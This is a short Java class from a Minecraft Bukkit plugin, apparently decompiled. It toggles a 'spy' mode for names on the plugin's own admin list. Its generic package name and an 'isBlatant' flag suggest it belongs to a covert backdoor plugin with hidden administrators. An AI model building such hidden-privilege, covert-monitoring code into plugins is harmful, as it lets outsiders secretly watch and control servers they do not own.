
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SpyCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.admin.contains(p2.getName())) {
            if (plugin.cmdSpy.contains(p2.getName())) {
                plugin.cmdSpy.remove(p2.getName());
                p2.sendMessage(Settings.PREFIX("Spy is now turned off"));
            } else {
                plugin.cmdSpy.add(p2.getName());
                p2.sendMessage(Settings.PREFIX("Spy is now turned on"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

